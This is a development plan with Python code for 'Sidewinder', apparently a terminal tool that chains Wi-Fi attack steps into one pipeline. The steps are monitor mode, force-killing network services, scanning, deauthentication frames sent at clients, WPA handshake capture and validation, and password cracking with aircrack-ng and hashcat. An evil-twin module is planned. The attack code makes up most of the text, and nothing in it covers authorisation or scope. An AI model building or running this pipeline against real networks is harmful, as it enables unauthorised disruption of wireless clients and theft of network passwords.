# Sidewinder — Implementation Plan

**3 Phases × 12 Subphases = 36 Total Units**

---

## Document Authority (Single Source of Truth)

| Document | Authority | Purpose |
|----------|-----------|---------|
| **IMPLEMENTATION.md** (this file) | **CANONICAL** | File structure, code snippets, dependency list, implementation details |
| **Sidewinder.md** | Philosophy + Research | Wcrack post-mortem, airmon-ng analysis, design decisions, UX rationale |
| **PLAN.md** | UX Design + TUI Mockups | 60 UX decisions, screen mockups, color palette, keybindings, slash commands |

**Rules:**
1. If IMPLEMENTATION.md and PLAN.md conflict on code → **IMPLEMENTATION.md wins**
2. If IMPLEMENTATION.md and Sidewinder.md conflict on philosophy → **Sidewinder.md wins**
3. TUI screen mockups → **PLAN.md is canonical** (§12 has all 16 screens)
4. Color palette → **PLAN.md §11.1 is canonical** (single source)
5. PMKID scope → **IMPLEMENTATION.md §3.5 is canonical** (deferred to Phase 2)
6. Regulatory domain → **IMPLEMENTATION.md §1.4 is canonical** (configurable, not hardcoded)

---

## Phase 1: Core (Basic Pipeline Works Flawlessly)

> **Goal:** Open terminal → detect adapter → scan → select target → capture handshake → crack password → cleanup. Zero crashes, zero memory leaks, zero zombie processes, zero silent failures.

### 1.1 Project Structure + Dependencies

**What:** Set up the Python package structure, dependency management, and entry point.

**Files:**
```
sidewinder/
├── sidewinder.py          # Entry point (sudo ./sidewinder)
├── __init__.py
├── core/
│   ├── __init__.py
│   ├── adapter.py         # Adapter detection (sysfs, iw, lsusb/lspci)
│   ├── subprocess.py      # Subprocess manager (asyncio, process groups)
│   ├── monitor.py         # Monitor mode (native iw/ip)
│   ├── services.py        # Service management (kill/restore NM)
│   ├── errors.py          # Error classification system
│   └── session.py         # Session save/resume
├── attacks/
│   ├── __init__.py
│   ├── deauth.py          # Deauth frame injection
│   └── evil_twin.py       # Evil twin (Phase 3)
│   # pmkid.py deferred to Phase 2
├── adapters/
│   ├── __init__.py
│   ├── base.py            # Abstract adapter interface
│   ├── rt5370.py          # RT5370 direct driver
│   ├── rtl8821au.py       # RTL8821AU morrownr driver
│   └── mt7902.py          # MT7902 detection + protection
├── parsers/
│   ├── __init__.py
│   ├── airodump.py        # Airodump-ng stdout parser
│   ├── eapol.py           # EAPOL handshake detection (scapy)
│   └── hashcat.py         # Hashcat progress + potfile parser
├── tools/
│   ├── __init__.py
│   ├── aircrack.py        # Aircrack-ng wrapper
│   ├── aireplay.py        # aireplay-ng wrapper
│   ├── airodump.py        # airodump-ng wrapper
│   ├── hcxdumptool.py     # hcxdumptool wrapper (Phase 2)
│   └── hcxpcapngtool.py   # hcxpcapngtool wrapper
├── tui/
│   ├── __init__.py
│   ├── app.py             # Textual app (main entry)
│   ├── screens/
│   │   ├── __init__.py
│   │   ├── main_menu.py   # Main menu screen
│   │   ├── scan.py        # Scan results screen
│   │   ├── target.py      # Target selection screen
│   │   ├── capture.py     # Capture method + progress screen
│   │   ├── deauth.py      # Deauth target selection screen
│   │   ├── crack.py       # Crack progress screen
│   │   ├── result.py      # Password found screen
│   │   ├── error.py       # Error card screen
│   │   ├── help.py        # Tutorial screen
│   │   └── settings.py    # Hardware & settings screen
│   ├── widgets/
│   │   ├── __init__.py
│   │   ├── signal_bar.py  # Signal strength visual
│   │   ├── status_bar.py  # Bottom status bar
│   │   ├── hint_bar.py    # Context hints
│   │   └── logo.py        # ASCII snake logo
│   └── styles/
│       ├── __init__.py
│       └── colors.tcss    # Textual CSS color palette
├── utils/
│   ├── __init__.py
│   ├── sysfs.py           # /sys/class/net/ reads
│   ├── iw.py              # iw command wrappers
│   ├── ip.py              # ip command wrappers
│   └── wordlist.py        # Wordlist auto-discovery
├── tests/
│   ├── __init__.py
│   ├── test_adapter.py
│   ├── test_subprocess.py
│   ├── test_parsers.py
│   ├── test_capture.py
│   ├── test_cracker.py
│   ├── test_errors.py
│   └── test_session.py
├── pyproject.toml         # Dependencies + build config
├── Makefile               # Common commands (test, lint, run)
└── README.md              # Usage instructions
```

**Dependencies (pyproject.toml):**
```toml
[project]
name = "sidewinder"
version = "0.1.0"
requires-python = ">=3.11"
dependencies = [
    "textual>=0.40",        # TUI framework (input + rendering + screens)
    "scapy>=2.5",           # Packet parsing (EAPOL handshake detection)
]

[project.optional-dependencies]
dev = [
    "pytest>=7.0",
    "pytest-asyncio>=0.21",
    "pytest-cov>=4.0",
    "ruff>=0.1.0",          # Linter
    "pyright>=1.1",         # Type checker
]

[project.scripts]
sidewinder = "sidewinder.sidewinder:main"
```

**Why these dependencies:**
- `textual` — Full TUI framework built on rich. Handles keyboard input (j/k/Enter/Esc/Space///), screen management, event loops, and async integration. `rich` alone cannot handle input.
- `scapy` — Industry standard for packet parsing. Used by HandshakeGrabber, EAPOLHunter, bettercap. Provides proper EAPOL layer with correct M1-M4 classification. Alternative: `tshark` subprocess (lighter but slower).
- `pyroute2` — Deferred to future. Not needed for MVP (using `iw`/`ip` subprocess).

**Verification:**
- [ ] `pip install -e ".[dev]"` succeeds
- [ ] `python -c "import sidewinder"` works
- [ ] `pytest` runs (0 tests, but no import errors)
- [ ] `ruff check sidewinder/` passes

**Estimated time:** 0.5 days

---

### 1.2 Adapter Detection System

**What:** Detect all wireless adapters via sysfs, identify chipset/driver/bands/monitor-injection capability.

**Core logic:**
```python
# sysfs reads (zero subprocess)
/sys/class/net/<iface>/phy80211/name          → PHY
/sys/class/net/<iface>/device/uevent          → DRIVER=
/sys/class/net/<iface>/device/idVendor        → USB VID
/sys/class/net/<iface>/device/idProduct       → USB PID
/sys/class/net/<iface>/address                → MAC
/sys/class/net/<iface>/operstate              → up/down
/sys/class/net/<iface>/type                   → mode (803=monitor)

# lsusb/lspci (subprocess, only for chipset name)
lsusb -d <VID>:<PID>                         → chipset string
lspci -d <VID>:<PID>                         → chipset string

# iw (subprocess, for capabilities)
iw dev <iface> info                           → mode, channel, txpower
iw phy <phy> info                             → supported bands, channels
iw list                                       → interface modes, monitor support
```

**Adapter registry:**
```python
KNOWN_DEVICES = {
    # RT5370
    (0x148F, 0x5370): {"name": "RT5370", "bands": "2.4G", "monitor": True, "injection": True},
    (0x148F, 0x5372): {"name": "RT5372", "bands": "2.4G", "monitor": True, "injection": True},
    # RTL8821AU
    (0x2357, 0x0120): {"name": "RTL8821AU", "bands": "2.4+5G", "monitor": True, "injection": True},
    (0x2357, 0x011E): {"name": "RTL8821AU", "bands": "2.4+5G", "monitor": True, "injection": True},
    # MT7902
    (0x14C3, 0x7902): {"name": "MT7902", "bands": "2.4+5+6G", "monitor": False, "injection": False},
}
```

**Verification:**
- [ ] Detects all 3 adapters (RT5370, RTL8821AU, MT7902)
- [ ] Correctly identifies bands, monitor, injection capabilities
- [ ] Handles missing adapters gracefully
- [ ] Unit test: mock sysfs, verify detection

**Estimated time:** 1 day

---

### 1.3 Subprocess Manager

**What:** Robust asyncio subprocess management with process group isolation, real-time streaming, and zombie prevention.

**Core class:**
```python
class SubprocessManager:
    async def run(self, cmd: list[str], timeout: float = 30.0) -> ProcessResult:
        """Run command with process group isolation"""
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            start_new_session=True,  # Process group isolation
        )
        try:
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=timeout
            )
            return ProcessResult(proc.returncode, stdout, stderr)
        except asyncio.TimeoutError:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            await asyncio.sleep(0.5)
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            raise TimeoutError(f"Command timed out: {' '.join(cmd)}")

    async def stream(self, cmd: list[str], callback: Callable) -> AsyncIterator[str]:
        """Stream stdout line-by-line to callback"""
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            start_new_session=True,
        )
        async for line in proc.stdout:
            decoded = line.decode().rstrip()
            await callback(decoded)
        await proc.wait()
```

**Key features:**
- `start_new_session=True` → process group isolation (no zombies)
- Timeout with SIGTERM → 0.5s → SIGKILL (graceful shutdown)
- Streaming parser for real-time airodump-ng output
- Automatic cleanup on exceptions

**Verification:**
- [ ] No zombie processes after 100 rapid subprocess calls
- [ ] Timeout kills process within 1 second
- [ ] Streaming parser handles 1000 lines/sec
- [ ] Memory stable after 10-minute stream
- [ ] Unit test: mock subprocess, verify cleanup

**Estimated time:** 1 day

---

### 1.4 Monitor Mode (Native iw/ip)

**What:** Enter/exit monitor mode using direct iw/ip calls, bypassing airmon-ng.

**Standard path (mac80211 drivers):**
```python
# Regulatory domain — CONFIGURABLE, not hardcoded
# Default: None (use system regulatory domain)
# User can override: --reg-domain BO (Bolivia) or --reg-domain IN (India)
#
# LEGAL DISCLAIMER: Changing regulatory domain may violate local RF regulations.
# Sidewinder does NOT automatically set regulatory domain. User must explicitly
# configure it and accept responsibility for compliance with local laws.

async def enter_monitor_mode(iface: str, phy: str, reg_domain: Optional[str] = None) -> str:
    """Enter monitor mode, return monitor interface name"""
    mon_iface = f"{iface}mon"

    # 0. Set regulatory domain if specified (user must explicitly opt-in)
    if reg_domain:
        await run(["iw", "reg", "set", reg_domain], check=False)

    # 1. Bring interface down
    await run(["ip", "link", "set", iface, "down"])

    # 2. Create monitor VIF
    await run(["iw", "phy", phy, "interface", "add", mon_iface, "type", "monitor"])

    # 3. Bring monitor up
    await run(["ip", "link", "set", mon_iface, "up"])

    # 4. Set channel (default ch6)
    await run(["iw", "dev", mon_iface, "set", "channel", "6"])

    # 5. Set TX power
    await run(["iw", "dev", mon_iface, "set", "txpower", "fixed", "3000"])

    # 6. Verify
    mode = await get_interface_mode(mon_iface)
    assert mode == "monitor", f"Expected monitor, got {mode}"

    return mon_iface

async def exit_monitor_mode(mon_iface: str, iface: str, phy: str):
    """Exit monitor mode, restore managed"""
    # 1. Delete monitor VIF
    await run(["iw", "dev", mon_iface, "del"])

    # 2. Recreate managed VIF
    await run(["iw", "phy", phy, "interface", "add", iface, "type", "station"])

    # 3. Bring up
    await run(["ip", "link", "set", iface, "up"])
```

**Bad driver fallback (RTL8821AU rtw88):**
```python
async def enter_monitor_mode_bad_driver(iface: str) -> str:
    """Direct mode change for drivers that don't support VIF creation"""
    await run(["ip", "link", "set", iface, "down"])
    await run(["iw", "dev", iface, "set", "type", "monitor"])
    await run(["ip", "link", "set", iface, "up"])
    await run(["iw", "dev", iface, "set", "monitor", "otherbss"])
    return iface
```

**Verification:**
- [ ] Monitor mode entered successfully
- [ ] Interface type = 803 (ARPHRD_IEEE80211_RADIOTAP)
- [ ] Channel set correctly
- [ ] TX power set correctly
- [ ] Cleanup restores managed mode
- [ ] Unit test: mock iw/ip calls

**Estimated time:** 1 day

---

### 1.5 Service Management (Kill/Restore)

**What:** Kill conflicting processes (NM, wpa_supplicant, dhclient), track them for later restoration.

**Core logic:**
```python
CONFLICTING_PROCESSES = [
    "NetworkManager",
    "wpa_supplicant",
    "wpa_cli",
    "dhclient",
    "dhcpcd",
    "avahi-daemon",
    "avahi-autoipd",
]

class ServiceManager:
    def __init__(self):
        self.killed_processes: list[KilledProcess] = []

    async def kill_conflicting(self) -> list[KilledProcess]:
        """Kill all conflicting processes, return list for restoration"""
        # 1. Find PIDs
        result = await run(["ps", "-A", "-o", "pid,comm="])
        for line in result.stdout.splitlines():
            parts = line.split(None, 1)
            if len(parts) == 2 and parts[1] in CONFLICTING_PROCESSES:
                pid = int(parts[0])
                # 2. Stop service (graceful)
                await run(["systemctl", "stop", parts[1]], check=False)
                # 3. Kill process (force)
                os.kill(pid, signal.SIGKILL)
                self.killed_processes.append(KilledProcess(pid, parts[1]))

    async def restore(self):
        """Restore killed processes with proper startup verification"""
        for kp in self.killed_processes:
            # Start service
            await run(["systemctl", "start", kp.name], check=False)

            # Wait for service to become active (with timeout)
            for _ in range(30):  # 30 * 0.5s = 15s max
                await asyncio.sleep(0.5)
                result = await run(["systemctl", "is-active", kp.name], check=False)
                if result.stdout.strip() == "active":
                    break
            else:
                # Service didn't start in time — log warning but continue
                logger.warning(f"Service {kp.name} did not become active within 15s")

        self.killed_processes.clear()
```

**Verification:**
- [ ] NM, wpa_supplicant, dhclient killed
- [ ] Processes tracked for restoration
- [ ] Restoration brings them back
- [ ] Handles already-stopped services gracefully
- [ ] Unit test: mock ps/systemctl

**Estimated time:** 0.5 days

---

### 1.6 Scan Engine (Airodump-ng Parser)

**What:** Run airodump-ng, parse stdout in real-time, extract networks and clients.

**Parser state machine:**
```
IDLE → detect "CH" line → HEADER
HEADER → detect "BSSID PWR" → AP_HEADER
AP_HEADER → blank line → AP_DATA
AP_DATA → parse each line → Network discovered
AP_DATA → detect "BSSID STATION" → CLIENT_HEADER
CLIENT_HEADER → blank line → CLIENT_DATA
CLIENT_DATA → parse each line → Client discovered
```

**Network data model:**
```python
@dataclass
class Network:
    bssid: str
    channel: int
    signal: int          # dBm
    privacy: str         # WPA2, WPA, OPEN
    cipher: str          # CCMP, TKIP
    auth: str            # PSK, MGT, OPN
    essid: str           # SSID (or "[HIDDEN]")
    wps: bool
    beacons: int
    data_packets: int
    first_seen: datetime
    last_seen: datetime

@dataclass
class Client:
    mac: str
    bssid: str           # AP it's connected to
    signal: int
    packets: int
    probe: str           # Last probe request
    first_seen: datetime
    last_seen: datetime
```

**Airodump-ng command:**
```python
cmd = [
    "airodump-ng", mon_iface,
    "--write", "/tmp/sidewinder_scan",
    "--output-format", "csv",
    "-a",                    # Only show associated clients
    "--wps",                 # Show WPS status
]
```

**Verification:**
- [ ] Parses AP list correctly (BSSID, CH, ENC, PWR, ESSID)
- [ ] Parses client list correctly (MAC, BSSID, PWR, packets)
- [ ] Handles hidden SSIDs ([HIDDEN])
- [ ] Handles WPS detection
- [ ] Real-time updates (1s refresh)
- [ ] Ctrl+C stops cleanly
- [ ] Unit test: mock airodump-ng output

**Estimated time:** 2 days

---

### 1.7 Target Selection

**What:** Display scan results, let user select target, lock channel, show target details.

**User flow:**
```
1. Display table of networks (rich.Table)
2. User navigates with j/k, selects with Enter
3. Lock channel: iw dev <mon> set channel <N>
4. Show target details (BSSID, SSID, CH, ENC, PWR, clients)
5. Show list of clients for this target
```

**Channel lock verification:**
```python
async def lock_channel(mon_iface: str, channel: int) -> bool:
    """Lock to specific channel and verify"""
    await run(["iw", "dev", mon_iface, "set", "channel", str(channel)])
    # Verify
    result = await run(["iw", "dev", mon_iface, "info"])
    return f"channel {channel}" in result.stdout.lower()
```

**Verification:**
- [ ] Table displays all networks
- [ ] Selection works (j/k/Enter)
- [ ] Channel locked and verified
- [ ] Target details shown
- [ ] Client list shown
- [ ] Unit test: mock scan data

**Estimated time:** 1 day

---

### 1.8 Capture Engine (Passive + Deauth)

**What:** Capture WPA handshake via passive listening or active deauth.

**Important:** EAPOL detection does NOT happen via airodump-ng stdout — it prints AP/client table refreshes, not frame details. Detection requires polling the PCAP file with scapy as a separate async task.

**Method A — Passive:**
```python
async def capture_passive(mon_iface: str, bssid: str, channel: int, output: str):
    """Passive capture — wait for handshake"""
    cmd = [
        "airodump-ng", mon_iface,
        "--bssid", bssid,
        "--channel", str(channel),
        "--write", output,
        "--output-format", "pcap",
    ]

    # Start airodump-ng (streams stdout for display only)
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        start_new_session=True,
    )

    # Separate EAPOL detection task — polls the PCAP file
    pcap_file = f"{output}-01.cap"
    eapol_task = asyncio.create_task(
        poll_eapol(pcap_file, bssid, timeout=300)  # 5 min timeout
    )

    # Stream airodump stdout for UI display (AP/client counts)
    async for line in proc.stdout:
        decoded = line.decode().rstrip()
        # Update UI stats (beacons, data, clients)
        await update_capture_stats(decoded)

    # Wait for EAPOL detection
    result = await eapol_task
    proc.terminate()
    return result

async def poll_eapol(pcap_file: str, bssid: str, timeout: float) -> Optional[HandshakeResult]:
    """Poll PCAP file for EAPOL handshake (runs as separate task)"""
    start = time.time()
    while time.time() - start < timeout:
        if os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 0:
            result = validate_handshake(pcap_file)
            if result.status in ["partial", "full"]:
                return result
        await asyncio.sleep(2)  # Check every 2 seconds
    return None  # Timeout
```

**Method B — Active Deauth:**
```python
async def capture_deauth(mon_iface: str, bssid: str, client: str, channel: int, count: int = 10):
    """Deauth + capture — channel must be passed explicitly (not looked up dynamically)"""
    # Start capture in background (channel is explicit, not from get_channel())
    capture_task = asyncio.create_task(
        capture_passive(mon_iface, bssid, channel, "/tmp/sidewinder_cap")
    )

    # Wait a moment for capture to start
    await asyncio.sleep(1)

    # Send deauth frames
    cmd = [
        "aireplay-ng", "--deauth", str(count),
        "-a", bssid,
        "-c", client,
        mon_iface,
    ]
    await run(cmd, timeout=30)

    # Wait for capture to complete (EAPOL detected)
    result = await capture_task
    return result
```

**Verification:**
- [ ] Passive capture works (polls PCAP file for EAPOL)
- [ ] Deauth sends frames
- [ ] Capture stops after handshake detected
- [ ] Both methods produce .cap file
- [ ] Channel passed explicitly (no race condition)
- [ ] Unit test: mock airodump-ng/aireplay-ng output

**Estimated time:** 2 days

---

### 1.9 EAPOL Validation

**What:** Validate captured handshake (M1-M4), compute SHA-256 hash.

**Validation logic (using scapy EAPOL layer):**
```python
import hashlib
from scapy.all import rdpcap
from scapy.layers.eap import EAPOL

# EAPOL Key Info bit definitions (IEEE 802.11-2020 Table 12-6)
KEY_INFO_PAIRWISE  = 0x0008  # Bit 3: Pairwise key
KEY_INFO_INSTALL   = 0x0040  # Bit 6: Install key
KEY_INFO_ACK       = 0x0080  # Bit 7: ACK
KEY_INFO_MIC       = 0x0100  # Bit 8: MIC
KEY_INFO_SECURE    = 0x0200  # Bit 9: Secure

# 4-way handshake message detection (correct bitmasks)
def is_m1(key_info: int) -> bool:
    """M1: Pairwise=1, Install=0, ACK=1, MIC=0, Secure=0"""
    return (key_info & KEY_INFO_PAIRWISE and
            not (key_info & KEY_INFO_INSTALL) and
            key_info & KEY_INFO_ACK and
            not (key_info & KEY_INFO_MIC) and
            not (key_info & KEY_INFO_SECURE))

def is_m2(key_info: int) -> bool:
    """M2: Pairwise=1, Install=0, ACK=0, MIC=1, Secure=0"""
    return (key_info & KEY_INFO_PAIRWISE and
            not (key_info & KEY_INFO_INSTALL) and
            not (key_info & KEY_INFO_ACK) and
            key_info & KEY_INFO_MIC and
            not (key_info & KEY_INFO_SECURE))

def is_m3(key_info: int) -> bool:
    """M3: Pairwise=1, Install=1, ACK=1, MIC=1, Secure=1"""
    return (key_info & KEY_INFO_PAIRWISE and
            key_info & KEY_INFO_INSTALL and
            key_info & KEY_INFO_ACK and
            key_info & KEY_INFO_MIC and
            key_info & KEY_INFO_SECURE)

def is_m4(key_info: int) -> bool:
    """M4: Pairwise=1, Install=0, ACK=0, MIC=1, Secure=1"""
    return (key_info & KEY_INFO_PAIRWISE and
            not (key_info & KEY_INFO_INSTALL) and
            not (key_info & KEY_INFO_ACK) and
            key_info & KEY_INFO_MIC and
            key_info & KEY_INFO_SECURE)

@dataclass
class HandshakeResult:
    status: str          # "full", "partial", "invalid"
    m1: bool
    m2: bool
    m3: bool
    m4: bool
    sha256: str
    eapol_count: int

def validate_handshake(cap_file: str) -> HandshakeResult:
    """Validate WPA handshake in capture file using scapy EAPOL layer"""
    packets = rdpcap(cap_file)
    eapols = [p for p in packets if p.haslayer(EAPOL)]

    m1 = m2 = m3 = m4 = False
    for pkt in eapols:
        eapol = pkt[EAPOL]
        # scapy EAPOL layer has key_info attribute for EAPOL-Key frames
        if hasattr(eapol, 'key_info'):
            key_info = eapol.key_info
            if is_m1(key_info):
                m1 = True
            elif is_m2(key_info):
                m2 = True
            elif is_m3(key_info):
                m3 = True
            elif is_m4(key_info):
                m4 = True

    if m1 and m2 and m3 and m4:
        status = "full"
    elif m1 and m2:
        status = "partial"  # Usable for offline crack
    else:
        status = "invalid"

    # Compute SHA-256
    sha256 = hashlib.sha256(open(cap_file, "rb").read()).hexdigest()

    return HandshakeResult(status, m1, m2, m3, m4, sha256, len(eapols))
```

**Note:** The previous bitmask implementation was incorrect — M3 check would never trigger due to `elif` after `M1` check (both share bit 0x0080). The corrected implementation uses proper `is_m1()` through `is_m4()` functions with full key_info flag sets as defined in IEEE 802.11-2020 Table 12-6.

**Verification:**
- [ ] Detects M1-M4 correctly
- [ ] Partial handshake (M1+M2) recognized
- [ ] Invalid capture detected
- [ ] SHA-256 computed
- [ ] Unit test: mock EAPOL packets

**Estimated time:** 1 day

---

### 1.10 Crack Engine (Aircrack-ng + Hashcat)

**What:** Crack captured handshake with aircrack-ng (CPU) or hashcat (GPU).

**Aircrack-ng:**
```python
async def crack_aircrack(cap_file: str, bssid: str, wordlist: str, callback: Callable):
    """Crack with aircrack-ng, stream progress"""
    cmd = [
        "aircrack-ng",
        "-w", wordlist,
        "-b", bssid,
        cap_file,
    ]
    async for line in stream(cmd, callback):
        # Parse: "1234567 keys/s", "ETA 00:15:30", "KEY FOUND!"
        if "KEY FOUND" in line:
            password = line.split("KEY FOUND!")[1].strip()
            return CrackResult(found=True, password=password)
    return CrackResult(found=False)
```

**Hashcat:**
```python
async def crack_hashcat(hash_file: str, wordlist: str, callback: Callable):
    """Crack with hashcat, stream progress"""
    # First convert to hashcat format
    hash_22000 = hash_file.replace(".cap", ".22000")
    await run(["hcxpcapngtool", "-o", hash_22000, hash_file])

    cmd = [
        "hashcat", "-m", "22000",
        hash_22000,
        "-a", "0",
        wordlist,
    ]
    async for line in stream(cmd, callback):
        # Parse: "Progress.....: 12.35%", "Speed.#1.....: 123456 keys/s"
        if "Status........: Cracked" in line:
            # Read potfile for password
            password = read_hashcat_potfile(hash_22000)
            return CrackResult(found=True, password=password)
    return CrackResult(found=False)

def read_hashcat_potfile(hash_file: str) -> Optional[str]:
    """Read cracked password from hashcat potfile"""
    potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
    if not os.path.exists(potfile):
        return None

    # Get the hash from the .22000 file (first line, before the colon)
    with open(hash_file) as f:
        target_hash = f.readline().strip().split(":")[0]

    # Search potfile for matching hash
    with open(potfile) as f:
        for line in f:
            parts = line.strip().split(":")
            if len(parts) >= 2 and parts[0] == target_hash:
                return parts[-1]  # Password is last field
    return None
```

**Verification:**
- [ ] Aircrack-ng works end-to-end
- [ ] Hashcat works end-to-end
- [ ] Progress parsing works (keys/s, ETA, current key)
- [ ] Password extracted on success
- [ ] Ctrl+C stops cleanly
- [ ] Unit test: mock aircrack-ng/hashcat output

**Estimated time:** 2 days

---

### 1.11 Cleanup System

**What:** Restore system to pre-attack state (managed mode, services, files).

**Cleanup checklist:**
```python
async def cleanup(mon_iface: str, iface: str, phy: str, service_manager: ServiceManager):
    """Full cleanup"""
    # 1. Kill attack processes
    await kill_process_group("airodump-ng")
    await kill_process_group("aireplay-ng")
    await kill_process_group("hashcat")

    # 2. Delete monitor VIF
    await run(["iw", "dev", mon_iface, "del"])

    # 3. Recreate managed VIF
    await run(["iw", "phy", phy, "interface", "add", iface, "type", "station"])
    await run(["ip", "link", "set", iface, "up"])

    # 4. Restore services
    await service_manager.restore()

    # 5. Verify connectivity
    result = await run(["ip", "addr", "show", iface])
    return "inet " in result.stdout
```

**File cleanup:**
```python
CLEANUP_DIRS = [
    "/tmp/sidewinder_*",           # Scan files
    "~/.sidewinder/captures/*",    # Captures
    "~/.sidewinder/results/*",     # Crack results
]

async def cleanup_files(confirm: bool = True):
    """Clean up temporary files with confirmation"""
    files = []
    for pattern in CLEANUP_DIRS:
        files.extend(glob.glob(os.path.expanduser(pattern)))

    if confirm:
        # Show files to user, ask for confirmation
        pass

    for f in files:
        os.remove(f)
```

**Verification:**
- [ ] Monitor VIF deleted
- [ ] Managed VIF restored
- [ ] NM, wpa_supplicant restarted
- [ ] No zombie processes
- [ ] Temporary files cleaned
- [ ] Network connectivity restored
- [ ] Unit test: mock cleanup operations

**Estimated time:** 1 day

---

### 1.12 Error Classification + Session Management

**What:** Structured error handling (Wcrack-style) + session save/resume.

**Error classification:**
```python
class Severity(Enum):
    INFO = "info"
    WARNING = "warning"
    ERROR = "error"
    CRITICAL = "critical"

class Category(Enum):
    HARDWARE = "hardware"
    PROCESS = "process"
    NETWORK = "network"
    PERMISSION = "permission"
    RESOURCE = "resource"
    USER = "user"

@dataclass
class SidewinderError:
    severity: Severity
    category: Category
    what: str              # What happened
    why: str               # Why it happened
    how_to_fix: list[str]  # How to fix
    raw_error: str         # Original error message
    timestamp: datetime

ERROR_DB = {
    "ADAPTER_NOT_FOUND": SidewinderError(
        severity=Severity.CRITICAL,
        category=Category.HARDWARE,
        what="No wireless adapter detected",
        why="USB adapter not plugged in or drivers not loaded",
        how_to_fix=[
            "Check USB connection",
            "Run: lsusb | grep -i wireless",
            "Install drivers: sudo apt install firmware-iwlwifi",
        ],
    ),
    "MONITOR_MODE_FAILED": SidewinderError(
        severity=Severity.ERROR,
        category=Category.HARDWARE,
        what="Failed to enter monitor mode",
        why="Driver doesn't support monitor mode or interface busy",
        how_to_fix=[
            "Kill conflicting processes: sudo airmon-ng check kill",
            "Try different adapter",
            "Check: iw list | grep -A 5 'Supported'",
        ],
    ),
    # ... 20+ error types
}
```

**Session management:**
```python
@dataclass
class Session:
    id: str                    # UUID
    start_time: datetime
    adapter: str
    scan_results: list[Network]
    selected_target: Optional[Network]
    captures: list[str]        # File paths
    cracked_passwords: list[CrackResult]
    logs: list[dict]           # JSONL log entries

    def save(self, path: str = "~/.sidewinder/session.json"):
        """Save session to disk"""
        with open(os.path.expanduser(path), "w") as f:
            json.dump(asdict(self), f, indent=2, default=str)

    @classmethod
    def load(cls, path: str = "~/.sidewinder/session.json") -> Optional["Session"]:
        """Load session from disk with proper nested deserialization"""
        expanded = os.path.expanduser(path)
        if not os.path.exists(expanded):
            return None

        with open(expanded) as f:
            data = json.load(f)

        # Deserialize nested dataclasses manually
        data["scan_results"] = [Network(**n) for n in data.get("scan_results", [])]
        data["selected_target"] = (
            Network(**data["selected_target"]) if data.get("selected_target") else None
        )
        data["cracked_passwords"] = [
            CrackResult(**c) for c in data.get("cracked_passwords", [])
        ]
        data["start_time"] = datetime.fromisoformat(data["start_time"])

        return cls(**data)
```

**Note:** `json.load()` returns plain dicts for nested objects. `cls(**json.load(f))` would pass raw dicts for `list[Network]` fields. The fix manually deserializes each nested dataclass type. Alternative: use `dacite` library for automatic nested deserialization.

**Verification:**
- [ ] Error classification works (severity, category, What/Why/HowToFix)
- [ ] Error database covers all common scenarios
- [ ] Session saves to disk
- [ ] Session loads from disk
- [ ] Session resume works (scan results preserved)
- [ ] Unit test: error creation, session save/load

**Estimated time:** 1 day

---

## Phase 2: Card Optimization (All 3 Cards Simultaneously)

> **Goal:** RT5370, RTL8821AU, and MT7902 each work optimally. Direct driver access where possible. Adapter-specific error handling. Zero generic "unknown adapter" messages.

### 2.1 Adapter Abstraction Layer

**What:** Abstract interface for all adapters with card-specific implementations.

**Base class:**
```python
class Adapter(ABC):
    """Abstract adapter interface"""
    name: str
    iface: str
    phy: str
    mac: str
    driver: str
    chipset: str
    bands: list[str]        # ["2.4G", "5G"]
    monitor_capable: bool
    injection_capable: bool
    status: str             # "OPTIMIZED", "WORKING", "LIMITED", "INTERNET_ONLY"

    @abstractmethod
    async def enter_monitor(self) -> str: ...

    @abstractmethod
    async def exit_monitor(self, mon_iface: str): ...

    @abstractmethod
    async def set_channel(self, channel: int): ...

    @abstractmethod
    async def inject_frame(self, frame: bytes): ...

    @abstractmethod
    def get_optimal_settings(self, operation: str) -> dict: ...
```

**Verification:**
- [ ] All 3 adapters implement the interface
- [ ] Type checking works (mypy/pyright)
- [ ] Unit test: mock adapter implementations

**Estimated time:** 1 day

---

### 2.2 RT5370 Direct Driver Commands

**What:** Bypass aircrack-ng, use direct iw commands for RT5370.

**Note:** `iwpriv` was deprecated in kernel 5.x and removed from modern kernels (Ubuntu 22.04+, Kali 2023+). Use modern `iw` equivalents where possible. For legacy kernels that still have `iwpriv`, use the direct commands as fallback.

**Modern iw commands (preferred):**
```python
RT5370_COMMANDS = {
    # Power Management (modern iw)
    "power_save_off": "iw dev <iface> set power_save off",

    # Rate Control (if supported by driver)
    "fixed_rate": "iw dev <iface> set bitrates legacy-2.4 6",

    # Channel
    "set_channel": "iw dev <iface> set channel <N>",

    # Bandwidth
    "ht20": "iw dev <iface> set channel <N> HT20",
    "ht40": "iw dev <iface> set channel <N> HT40+",
}

# Legacy iwpriv commands (fallback for old kernels)
RT5370_IWPRIV_COMMANDS = {
    "PSMode=CAM":       "Constantly Active Mode — no power save",
    "FixedTxMode=OFDM": "Use OFDM (not CCK) for better range",
    "HtMcs=0":          "HT MCS 0 (6 Mbps) — most reliable",
    "CountryRegion=5":  "India (1-13)",
}
```

**Initialization sequence:**
```python
async def init_rt5370_optimized(iface: str) -> bool:
    """RT5370 OPTIMIZED initialization"""
    await run(["ip", "link", "set", iface, "down"])
    await run(["iw", "dev", iface, "set", "type", "monitor"])
    await run(["iw", "dev", iface, "set", "monitor", "fcsfail", "otherbss"])
    await run(["ip", "link", "set", iface, "up"])

    # Modern power save control
    await run(["iw", "dev", iface, "set", "power_save", "off"], check=False)

    # Try legacy iwpriv if available (for old kernels)
    result = await run(["which", "iwpriv"], check=False)
    if result.returncode == 0:
        await run(["iwpriv", iface, "set", "PSMode=CAM"], check=False)
        await run(["iwpriv", iface, "set", "FixedTxMode=OFDM"], check=False)
        await run(["iwpriv", iface, "set", "HtMcs=0"], check=False)

    return True
```

**Verification:**
- [ ] Power save disabled (via iw or iwpriv)
- [ ] Rate set to optimal
- [ ] Monitor mode works with Prism2 header
- [ ] Graceful fallback if iwpriv not available
- [ ] Unit test: mock iw/iwpriv calls

